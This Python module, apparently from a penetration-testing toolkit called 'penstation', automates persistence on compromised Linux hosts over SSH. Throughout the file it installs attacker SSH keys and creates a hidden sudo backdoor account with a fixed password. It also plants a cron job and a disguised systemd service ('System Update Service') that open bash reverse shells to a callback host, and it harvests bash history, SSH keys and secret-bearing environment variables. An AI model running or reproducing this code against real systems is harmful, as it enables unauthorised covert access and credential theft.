"""Host zombification — install persistence mechanisms on compromised hosts."""

import asyncio
import logging
from datetime import datetime

logger = logging.getLogger("penstation.zombification")


async def _ssh_exec(
    host_ip: str,
    username: str,
    password: str,
    command: str,
    port: int = 22,
    timeout: int = 30,
) -> tuple[bool, str]:
    """Execute command on remote host via SSH using sshpass."""
    cmd = [
        "sshpass", "-p", password,
        "ssh",
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "ConnectTimeout=10",
        "-p", str(port),
        f"{username}@{host_ip}",
        command,
    ]

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        output = stdout.decode() + stderr.decode()
        return proc.returncode == 0, output
    except asyncio.TimeoutError:
        return False, "SSH command timed out"
    except FileNotFoundError:
        return False, "sshpass not installed. Run: sudo apt install sshpass"
    except Exception as e:
        return False, str(e)


async def ssh_test_access(
    host_ip: str,
    username: str,
    password: str,
    port: int = 22,
) -> dict:
    """Test SSH access to a host with given credentials."""
    success, output = await _ssh_exec(
        host_ip, username, password, "id && hostname && uname -a", port
    )

    result = {
        "success": success,
        "host_ip": host_ip,
        "username": username,
        "port": port,
    }

    if success:
        lines = output.strip().split("\n")
        result["user_info"] = lines[0] if lines else ""
        result["hostname"] = lines[1] if len(lines) > 1 else ""
        result["system"] = lines[2] if len(lines) > 2 else ""

        # Check if we have sudo
        sudo_ok, sudo_out = await _ssh_exec(
            host_ip, username, password,
            "echo '' | sudo -S id 2>/dev/null || echo 'no_sudo'",
            port,
        )
        result["has_sudo"] = "no_sudo" not in sudo_out and "uid=0" in sudo_out
    else:
        result["error"] = output

    return result


async def install_ssh_key(
    host_ip: str,
    username: str,
    password: str,
    port: int = 22,
) -> dict:
    """
    Install our SSH public key on the target for persistent passwordless access.

    Generates a keypair if needed and adds public key to authorized_keys.
    """
    from pathlib import Path

    key_dir = Path("/home/kali/penstation/keys")
    key_dir.mkdir(parents=True, exist_ok=True)
    key_path = key_dir / f"zombie_{host_ip.replace('.', '_')}"
    pub_path = key_path.with_suffix(".pub")

    # Generate keypair if needed
    if not key_path.exists():
        gen = await asyncio.create_subprocess_exec(
            "ssh-keygen", "-t", "ed25519", "-f", str(key_path),
            "-N", "", "-C", f"penstation@{host_ip}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        await gen.communicate()

    if not pub_path.exists():
        return {"success": False, "error": "Failed to generate SSH key"}

    pub_key = pub_path.read_text().strip()

    # Install key on target
    install_cmd = (
        f"mkdir -p ~/.ssh && chmod 700 ~/.ssh && "
        f"echo '{pub_key}' >> ~/.ssh/authorized_keys && "
        f"chmod 600 ~/.ssh/authorized_keys && "
        f"echo 'KEY_INSTALLED'"
    )

    success, output = await _ssh_exec(
        host_ip, username, password, install_cmd, port
    )

    if success and "KEY_INSTALLED" in output:
        # Verify key-based access
        verify_cmd = [
            "ssh",
            "-i", str(key_path),
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "ConnectTimeout=10",
            "-o", "PasswordAuthentication=no",
            "-p", str(port),
            f"{username}@{host_ip}",
            "echo KEY_ACCESS_OK",
        ]
        proc = await asyncio.create_subprocess_exec(
            *verify_cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=15)

        verified = "KEY_ACCESS_OK" in stdout.decode()

        return {
            "success": verified,
            "host_ip": host_ip,
            "username": username,
            "key_path": str(key_path),
            "message": "SSH key installed and verified" if verified else "Key installed but verification failed",
        }

    return {
        "success": False,
        "host_ip": host_ip,
        "error": f"Failed to install key: {output}",
    }


async def create_backdoor_user(
    host_ip: str,
    username: str,
    password: str,
    backdoor_user: str = "sysservice",
    backdoor_pass: str = "Serv1ce!2025",
    port: int = 22,
) -> dict:
    """
    Create a backdoor user with sudo access on the target.

    Requires sudo access on the target.
    """
    # Check sudo
    access = await ssh_test_access(host_ip, username, password, port)
    if not access.get("has_sudo"):
        return {
            "success": False,
            "host_ip": host_ip,
            "error": "Need sudo access to create backdoor user",
        }

    # Create user with sudo privileges
    create_cmd = (
        f"sudo useradd -m -s /bin/bash -G sudo {backdoor_user} 2>/dev/null; "
        f"echo '{backdoor_user}:{backdoor_pass}' | sudo chpasswd && "
        f"echo 'USER_CREATED'"
    )

    success, output = await _ssh_exec(
        host_ip, username, password, create_cmd, port
    )

    if success and "USER_CREATED" in output:
        # Verify access with new user
        verify = await ssh_test_access(host_ip, backdoor_user, backdoor_pass, port)

        return {
            "success": verify.get("success", False),
            "host_ip": host_ip,
            "backdoor_user": backdoor_user,
            "backdoor_pass": backdoor_pass,
            "port": port,
            "message": "Backdoor user created" if verify.get("success") else "User created but access failed",
        }

    return {
        "success": False,
        "host_ip": host_ip,
        "error": f"Failed to create user: {output}",
    }


async def install_cron_callback(
    host_ip: str,
    username: str,
    password: str,
    callback_ip: str,
    callback_port: int = 4444,
    port: int = 22,
) -> dict:
    """
    Install a cron job that periodically connects back to PENSTATION.

    Creates a reverse shell cron job that runs every 5 minutes.
    """
    # Reverse shell payload (bash TCP)
    payload = (
        f"/bin/bash -c 'bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1' 2>/dev/null"
    )

    # Install cron job
    cron_cmd = (
        f'(crontab -l 2>/dev/null; echo "*/5 * * * * {payload}") | '
        f"crontab - && echo 'CRON_INSTALLED'"
    )

    success, output = await _ssh_exec(
        host_ip, username, password, cron_cmd, port
    )

    if success and "CRON_INSTALLED" in output:
        return {
            "success": True,
            "host_ip": host_ip,
            "callback": f"{callback_ip}:{callback_port}",
            "interval": "every 5 minutes",
            "message": "Cron callback installed. Start listener: nc -lvnp " + str(callback_port),
        }

    return {
        "success": False,
        "host_ip": host_ip,
        "error": f"Failed to install cron: {output}",
    }


async def install_systemd_persistence(
    host_ip: str,
    username: str,
    password: str,
    callback_ip: str,
    callback_port: int = 4445,
    port: int = 22,
) -> dict:
    """
    Install systemd service that persists across reboots.

    Creates a hidden systemd user service that connects back.
    """
    access = await ssh_test_access(host_ip, username, password, port)

    service_content = f"""[Unit]
Description=System Update Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1 2>/dev/null; sleep 60; done'
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
"""

    if access.get("has_sudo"):
        # System-level service (requires sudo)
        install_cmd = (
            f"echo '{service_content}' | sudo tee /etc/systemd/system/.sys-update.service > /dev/null && "
            f"sudo systemctl daemon-reload && "
            f"sudo systemctl enable .sys-update.service && "
            f"sudo systemctl start .sys-update.service && "
            f"echo 'SERVICE_INSTALLED'"
        )
    else:
        # User-level service (no sudo needed)
        install_cmd = (
            f"mkdir -p ~/.config/systemd/user && "
            f"echo '{service_content}' > ~/.config/systemd/user/sys-update.service && "
            f"systemctl --user daemon-reload && "
            f"systemctl --user enable sys-update.service && "
            f"systemctl --user start sys-update.service && "
            f"loginctl enable-linger {username} 2>/dev/null; "
            f"echo 'SERVICE_INSTALLED'"
        )

    success, output = await _ssh_exec(
        host_ip, username, password, install_cmd, port
    )

    return {
        "success": success and "SERVICE_INSTALLED" in output,
        "host_ip": host_ip,
        "callback": f"{callback_ip}:{callback_port}",
        "level": "system" if access.get("has_sudo") else "user",
        "message": (
            "Systemd persistence installed. Start listener: nc -lvnp " + str(callback_port)
            if "SERVICE_INSTALLED" in output
            else f"Failed: {output}"
        ),
    }


async def gather_host_info(
    host_ip: str,
    username: str,
    password: str,
    port: int = 22,
) -> dict:
    """
    Gather detailed information from a compromised host.

    Collects: users, network config, running services, installed software, etc.
    """
    commands = {
        "hostname": "hostname -f 2>/dev/null || hostname",
        "os": "cat /etc/os-release 2>/dev/null | head -5",
        "kernel": "uname -a",
        "users": "cat /etc/passwd | grep -v nologin | grep -v false | cut -d: -f1",
        "sudo_users": "getent group sudo 2>/dev/null || getent group wheel 2>/dev/null",
        "network": "ip -4 addr show 2>/dev/null || ifconfig 2>/dev/null",
        "routes": "ip route 2>/dev/null || route -n 2>/dev/null",
        "arp": "arp -a 2>/dev/null || ip neigh 2>/dev/null",
        "listening_ports": "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null",
        "processes": "ps aux --sort=-%mem 2>/dev/null | head -20",
        "crontabs": "crontab -l 2>/dev/null; ls -la /etc/cron* 2>/dev/null | head -20",
        "ssh_keys": "find /home -name authorized_keys -o -name id_rsa 2>/dev/null | head -10",
        "history": "cat ~/.bash_history 2>/dev/null | tail -50",
        "env": "env 2>/dev/null | grep -iE '(pass|key|token|secret|api)' || echo 'nothing'",
    }

    info = {
        "success": True,
        "host_ip": host_ip,
        "username": username,
        "gathered_at": datetime.utcnow().isoformat(),
    }

    for key, cmd in commands.items():
        success, output = await _ssh_exec(
            host_ip, username, password, cmd, port, timeout=15
        )
        info[key] = output.strip() if success else f"ERROR: {output}"

    return info


async def check_zombie_status(
    host_ip: str,
    username: str,
    password: str = "",
    key_path: str = "",
    port: int = 22,
) -> dict:
    """Check if a zombified host is still accessible."""
    if key_path:
        # Try key-based access
        cmd = [
            "ssh",
            "-i", key_path,
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "ConnectTimeout=10",
            "-o", "PasswordAuthentication=no",
            "-p", str(port),
            f"{username}@{host_ip}",
            "echo ALIVE && uptime",
        ]
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
            output = stdout.decode()
            alive = "ALIVE" in output
            return {
                "alive": alive,
                "host_ip": host_ip,
                "auth": "ssh_key",
                "uptime": output.split("ALIVE")[-1].strip() if alive else "",
            }
        except Exception as e:
            return {"alive": False, "host_ip": host_ip, "error": str(e)}
    elif password:
        result = await ssh_test_access(host_ip, username, password, port)
        return {
            "alive": result.get("success", False),
            "host_ip": host_ip,
            "auth": "password",
            "info": result,
        }
    else:
        return {"alive": False, "error": "Need password or key_path"}
